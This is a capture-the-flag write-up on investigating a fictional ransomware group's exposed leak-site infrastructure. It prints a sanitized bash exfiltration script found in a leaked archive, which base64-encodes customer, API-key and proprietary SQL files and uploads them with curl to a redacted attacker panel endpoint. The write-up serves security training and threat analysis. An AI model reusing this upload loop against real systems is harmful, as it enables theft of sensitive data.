# 👖 Pantalones CTF — Write-up

> A CTF investigation into exposed attacker infrastructure, leaked secrets,
> poor credential handling, API enumeration, and operational security failures.

## 🎯 Objective

Investigate the Pantalones ransomware group's exposed infrastructure and
discover the hidden flag.

---

## 🧰 Skills & Techniques

- OSINT
- Web investigation
- API enumeration
- Source-code analysis
- Secret discovery
- Base64 decoding
- Credential analysis
- Authentication testing
- Threat intelligence
- Attacker OPSEC analysis

---

# 🔎 1. Initial Reconnaissance

The challenge presented a leak site containing multiple victims.

Two particularly interesting targets were:

- QuantumCore Systems
- AetherFlow Enterprises

AetherFlow was especially interesting because its leaked archive contained
not only business data but also a hidden operational script.

### Evidence

![Leak site]([https://github.com/DivyaKetha/CTF_writeups/blob/df9c3dea60c148f57258bf1dd99ef10a5c32f900/pantalones-ctf/Screenshots/Leaked-Site.png])

---

# 🕵️ 2. Discovering the Hidden `.exfil.sh`

Inside the AetherFlow leak, I found:

```text
api_keys_internal.yaml
route_algorithms_PROPRIETARY.sql
customers.sql
.exfil.sh

```

🕵️ 3. Discovering .exfil.sh

The script revealed information about how the attackers were transferring
stolen files to their infrastructure.

It contained:

A panel address
An API endpoint
An authentication header
An upload action
A list of files being exfiltrated
Base64 encoding of file contents

A sanitized representation of the relevant logic looked like:

```
PANEL="[REDACTED]"
KEY="[REDACTED]"


TARGETS=(
    "route_algorithms_PROPRIETARY.sql"
    "customers.sql"
    "api_keys_internal.yaml"
)


for f in "${TARGETS[@]}"; do
    b64=$(base64 -w0 "$f")


    curl -s -X POST "${PANEL}/api.php?action=upload" \
        -H "X-Panel-Key: [REDACTED]" \
        -d "chunk=${b64}&fname=${f}&tag=aetherflow"
done

```
